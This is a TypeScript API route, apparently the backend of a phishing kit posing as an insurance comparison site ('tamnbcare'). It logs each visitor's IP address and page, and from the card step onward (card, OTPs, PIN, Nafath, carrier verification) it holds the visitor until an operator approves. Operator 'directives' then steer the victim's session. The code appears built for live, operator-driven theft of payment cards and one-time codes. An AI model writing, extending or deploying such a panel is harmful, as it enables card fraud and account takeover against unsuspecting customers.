import { createFileRoute } from "@tanstack/react-router";
import { makeServiceClient } from "@/lib/admin-api.server";
import { z } from "zod";

const ALLOWED_ORIGINS = [
  "https://tmnbcre.lovable.app",
  "https://tamnbcare.online",
];

function corsHeaders(origin: string | null) {
  return {
    "Access-Control-Allow-Origin":
      origin && ALLOWED_ORIGINS.includes(origin) ? origin : ALLOWED_ORIGINS[0],
    "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
    "Access-Control-Allow-Headers": "content-type",
    Vary: "Origin",
  };
}

const BodySchema = z.discriminatedUnion("action", [
  z.object({
    action: z.literal("request"),
    sid: z.string().min(4).max(64),
    path: z.string().min(1).max(200),
  }),
  z.object({
    action: z.literal("ack"),
    sid: z.string().min(4).max(64),
    nonce: z.string().min(1).max(80),
  }),
]);

function makeClient() {
  return makeServiceClient();
}

function getIp(request: Request): string | null {
  return (
    request.headers.get("cf-connecting-ip") ||
    request.headers.get("x-real-ip") ||
    (request.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ?? null)
  );
}

export const Route = createFileRoute("/api/public/gate")({
  server: {
    handlers: {
      OPTIONS: async ({ request }) => {
        const origin = request.headers.get("origin");
        return new Response(null, { status: 204, headers: corsHeaders(origin) });
      },
      GET: async ({ request }) => {
        const origin = request.headers.get("origin");
        if (origin && !ALLOWED_ORIGINS.includes(origin)) {
          return new Response("Origin not allowed", { status: 403, headers: corsHeaders(origin) });
        }
        const url = new URL(request.url);
        const sid = url.searchParams.get("sid");
        if (!sid) return new Response("sid required", { status: 400, headers: corsHeaders(origin) });
        const supabase = makeClient();
        const { data, error } = await supabase
          .from("tracked_sessions")
          .select("awaiting_approval,requested_page,admin_directive,directive_nonce,current_page,state")
          .eq("session_id", sid)
          .maybeSingle();
        if (error) {
          return new Response(JSON.stringify({ error: error.message }), {
            status: 500,
            headers: { ...corsHeaders(origin), "Content-Type": "application/json" },
          });
        }
        return new Response(JSON.stringify({ session: data ?? null }), {
          headers: { ...corsHeaders(origin), "Content-Type": "application/json", "Cache-Control": "no-store" },
        });
      },
      POST: async ({ request }) => {
        const origin = request.headers.get("origin");
        if (origin && !ALLOWED_ORIGINS.includes(origin)) {
          return new Response("Origin not allowed", { status: 403, headers: corsHeaders(origin) });
        }
        let json: unknown;
        try {
          json = await request.json();
        } catch {
          return new Response("Bad JSON", { status: 400, headers: corsHeaders(origin) });
        }
        const parsed = BodySchema.safeParse(json);
        if (!parsed.success) {
          return new Response("Invalid payload", { status: 400, headers: corsHeaders(origin) });
        }
        const supabase = makeClient();
        const ip = getIp(request);

        if (parsed.data.action === "request") {
          const { sid, path } = parsed.data;
          const now = new Date().toISOString();
          // Pages before the card step don't require admin approval — the
          // customer can continue freely if they enter valid info. Gate kicks
          // in from the payment/card step onward (card, OTPs, PIN, phone,
          // Motsl, Nafath, STC, Mobily, etc).
          const p = path.toLowerCase();
          const preCard =
            p === "/" ||
            p.startsWith("/quote") ||
            p.startsWith("/compare") ||
            p.startsWith("/register") ||
            p.startsWith("/insurer") ||
            p.startsWith("/landing") ||
            p.startsWith("/offer");
          const requiresApproval = !preCard;
          const row: Record<string, unknown> = {
            session_id: sid,
            state: "live",
            awaiting_approval: requiresApproval,
            requested_page: path,
            admin_directive: null,
            directive_nonce: null,
            current_page: path,
            updated_at: now,
          };
          if (ip) row["ip_address"] = ip;
          const { error } = await supabase
            .from("tracked_sessions")
            .upsert(row, { onConflict: "session_id" });
          if (error) {
            return new Response(JSON.stringify({ error: error.message }), {
              status: 500,
              headers: { ...corsHeaders(origin), "Content-Type": "application/json" },
            });
          }
          return new Response(JSON.stringify({ ok: true, awaiting: requiresApproval }), {
            headers: { ...corsHeaders(origin), "Content-Type": "application/json" },
          });
        }


        // ack
        const { sid, nonce } = parsed.data;
        const { data: existing } = await supabase
          .from("tracked_sessions")
          .select("directive_nonce")
          .eq("session_id", sid)
          .maybeSingle();
        if (existing?.directive_nonce === nonce) {
          await supabase
            .from("tracked_sessions")
            .update({
              admin_directive: null,
              directive_nonce: null,
              updated_at: new Date().toISOString(),
            })
            .eq("session_id", sid);
        }
        return new Response(JSON.stringify({ ok: true }), {
          headers: { ...corsHeaders(origin), "Content-Type": "application/json" },
        });
      },
    },
  },
});
